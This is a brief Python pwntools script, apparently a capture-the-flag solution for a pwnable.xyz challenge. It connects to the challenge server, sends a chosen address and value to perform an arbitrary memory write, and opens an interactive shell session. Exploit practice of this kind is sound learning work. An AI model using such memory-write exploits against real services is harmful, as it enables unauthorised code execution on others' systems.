from pwn import *

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30033)

#pause()

s.recvuntil("Addr: ")
s.send("6294464")
s.recvuntil("Value: ")
s.send("4196385")

s.interactive()
